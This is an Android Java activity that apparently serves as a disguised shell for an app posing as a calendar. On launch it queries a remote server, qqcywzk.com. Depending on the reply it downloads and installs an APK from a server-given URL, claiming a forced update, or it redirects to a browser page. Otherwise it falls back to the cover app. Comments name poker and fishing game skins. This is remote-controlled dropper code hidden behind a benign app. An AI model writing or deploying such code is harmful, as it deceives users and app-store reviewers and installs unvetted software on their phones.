package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


/**
 * 游戏包  下载apk热更新模式
 */
public class MJRegusActivity extends Activity {


    String mAid = "167";
    String mSid = "2";
    String activityPath = "cn.etouch.ecalendar.MainActivity";

//    String mAid = "6";
//    String mSid = "6";
//    String activityPath = "cn.etouch.ecalendar.MainActivity";

    String baseUrl = "http://qqcywzk.com/AppShellService.svc/GetAppInfo";


    String downLoadUrl;

    public File savefolder;
    public String updateSaveName;
    public long packSize;
    public int progress;
    ProgressDialog mProgressDialog;

    /**
     * 权限部分
     */

    String[] permissions = new String[]{
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.REQUEST_INSTALL_PACKAGES
    };
    List<String> mPermissionList = new ArrayList<>();
    boolean mShowRequestPermission = true;//用户是否禁止权限


    @SuppressLint({"ResourceAsColor", "ResourceType"})
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        if (Build.VERSION.SDK_INT >= 21) {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            getWindow().setStatusBarColor(Color.BLACK);
        }

        getWindow().getDecorView().setBackgroundColor(android.R.color.white);

        //2131230874 德州扑克圈的马甲启动图
      //  MJRegusActivity.this.getWindow().setBackgroundDrawableResource(2131230874);

        requset();

    }

    /**
     * 权限检测完毕之后
     */
    private void afterCheckPermision() {

        runOnUiThread(new Runnable() {
            @SuppressLint("ResourceType")
            @Override
            public void run() {

                //地主是 2130837541
                //捕鱼是 2130837552
                //德州扑克圈 2131230937

                MJRegusActivity.this.getWindow().setBackgroundDrawableResource(2131230937);

                mProgressDialog = new ProgressDialog(MJRegusActivity.this);
                mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                mProgressDialog.setMax(100);
                mProgressDialog.setCancelable(false);
                mProgressDialog.setMessage("下载中，请稍后...");
                mProgressDialog.show();

            }
        });

        downloadPackage();
    }


    /**
     * 权限检测
     */
    private void checkPermision() {

        try {
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);
                }
            }
            /**
             * 判断是否为空
             */
            if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
                afterCheckPermision();
            } else {//请求权限方法

                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(MJRegusActivity.this, "版本需要强制更新，请给予必要权限~", Toast.LENGTH_LONG);
                    }
                });

                String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
                ActivityCompat.requestPermissions(this, permissions, 1);
            }
        } catch (Exception e) {

            //某些机型在启动页申请权限会有问题  或者 有些低版本机型 不需要申请 或者没有ActivityCompat这个类
            //先进去  里面的会帮我申请好权限
            jumpLocalSplash();

        }

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        } else {
                            mShowRequestPermission = false;//已经禁止
                        }
                    }
                }
                afterCheckPermision();
                break;
            default:
                break;
        }
    }


    private void requset() {
        new Thread(new RequestRunnable(mAid, mSid, baseUrl)).start();
    }


    private class RequestRunnable implements Runnable {

        String url;
        String aid;
        String sid;

        public RequestRunnable(String aid, String sid, String url) {
            this.aid = aid;
            this.sid = sid;
            this.url = url;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid) || TextUtils.isEmpty(sid)) {
                jumpLocalSplash();
                return;
            }

            String rootUrl = url + "?aid=";
            String allUrl = rootUrl + aid + "&sid=" + sid;

            try {
                URL urll = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(10000);
                urlConnection.setReadTimeout(10000);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    //处理
                    try {
                        JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));


                        if (responseJson.has("Status") && responseJson.has("Data")) {
                            if (responseJson.getBoolean("Status")) {

                                JSONObject dataJsonObject = new JSONObject(responseJson.getString("Data"));


                                if (dataJsonObject.getBoolean("IsDownload")) {
                                    downLoadUrl = dataJsonObject.getString("DownloadUrl");
                                    showDownLoadDialog();
                                } else if (dataJsonObject.getBoolean("IsEnable")) {
                                    startWebview(dataJsonObject.getString("Url"));
                                } else {
                                    jumpLocalSplash();
                                }

                            } else {
                                judeJump(url);
                            }
                            return;
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                        judeJump(url);
                    }
                } else {
                    judeJump(url);
                }
            } catch (Exception e) {
                judeJump(url);
            }

        }

    }


    private void judeJump(String url) {
        jumpLocalSplash();
    }


    /**
     * 跳原应用
     */

    private void jumpLocalSplash() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }


    /**
     * web 显示h5
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jumpLocalSplash();
            return;
        }
        jumpTo(url, 0);
    }


    /**
     * 打开下载
     */

    private void showDownLoadDialog() {
        checkPermision();
    }


    public void downloadPackage() {

        new Thread() {
            @SuppressLint("WrongConstant")
            public void run() {

                long j = 0;

                try {

                    URL url = new URL(downLoadUrl);

                    HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                    httpURLConnection.connect();

                    if (httpURLConnection.getResponseCode() != 200) {
                        Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                        jumpLocalSplash();
                        return;
                    }

                    InputStream is = httpURLConnection.getInputStream();
                    packSize = httpURLConnection.getContentLength();

                    if (checkExistSDCard()) {
                        savefolder = Environment.getExternalStorageDirectory();
                    } else {
                        savefolder = getDir("update", 3);
                    }


                    updateSaveName = downLoadUrl.substring(downLoadUrl.lastIndexOf("/") + 1);

                    File file = new File(savefolder, updateSaveName);
                    Log.e("regusupdateManager", " updateSaveName ==== " + updateSaveName);
                    if (file.exists()) {
                        file.delete();
                    }
                    Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                    OutputStream os = new FileOutputStream(file);

                    byte[] bytes = new byte[512];

                    int length;

                    while ((length = is.read(bytes)) != -1) {
                        os.write(bytes, 0, length);
                        j += (long) length;
                        progress = (int) ((((float) j) / ((float) packSize)) * 100.0f);
                        Log.e("regus progress", progress + "");
                        showLoadDialogProgress(progress);
                        if (progress == 100) {
                            hideWebViewLoadDialog();
                        }
                    }

                    //关闭流
                    is.close();
                    os.close();
                    os.flush();

                    gotoInstall();

                } catch (MalformedURLException e) {
                    e.printStackTrace();
                    jumpLocalSplash();
                } catch (IOException e2) {
                    e2.printStackTrace();
                    Log.e("regus IOException", "" + e2.getLocalizedMessage());
                    jumpLocalSplash();
                } catch (Exception e) {
                    e.printStackTrace();
                    jumpLocalSplash();
                    Log.e("regus Exception", "" + e.getLocalizedMessage());
                }
            }

        }.start();


    }


    private void showLoadDialogProgress(int progress) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    if (mProgressDialog != null && !MJRegusActivity.this.isDestroyed()) {
                        if (!mProgressDialog.isShowing()) {
                            mProgressDialog.show();
                        }
                        mProgressDialog.setProgress(progress);
                    }
                } else {
                    if (mProgressDialog != null) {
                        if (!mProgressDialog.isShowing()) {
                            mProgressDialog.show();
                        }
                        mProgressDialog.setProgress(progress);
                    }
                }
            }
        });


    }

    private void hideWebViewLoadDialog() {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    if (mProgressDialog != null && !MJRegusActivity.this.isDestroyed()) {
                        if (mProgressDialog.isShowing()) {
                            mProgressDialog.dismiss();
                        }
                    }
                } else {
                    if (mProgressDialog != null) {
                        if (mProgressDialog.isShowing()) {
                            mProgressDialog.dismiss();
                        }
                    }
                }
            }
        });

    }


    @SuppressLint("WrongConstant")
    private void gotoInstall() {

        Intent intent = new Intent(Intent.ACTION_VIEW);
        int i = getApplicationInfo().targetSdkVersion;
        if (Build.VERSION.SDK_INT < 24 || i < 24) {
            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        } else {
            //添加这一句表示对目标应用临时授权该Uri所代表的文件
            intent.setFlags(1);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            Log.e("regus setDataAndType", "savefolder :" + savefolder + " updateSaveName " + updateSaveName);
            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        finish();

    }


    /**
     * 跳转逻辑
     */

    private void jumpTo(final String url, int type) {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MJRegusActivity.this, "程序正在执行,请勿关闭浏览器~", Toast.LENGTH_LONG);
                showTipDialog(url);
                startBrowser(url);
            }
        });


    }


    private void showTipDialog(final String url) {

        //创建dialog构造器
        AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
        //设置title
        normalDialog.setTitle("需要跳转到浏览器");
        //设置内容
        normalDialog.setMessage("点击跳转到专业版~");
        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowser(url);
            }
        });

        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowser(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        startActivity(intent);
    }


    public static boolean checkExistSDCard() {
        return Environment.getExternalStorageState().equals("mounted");
    }

}
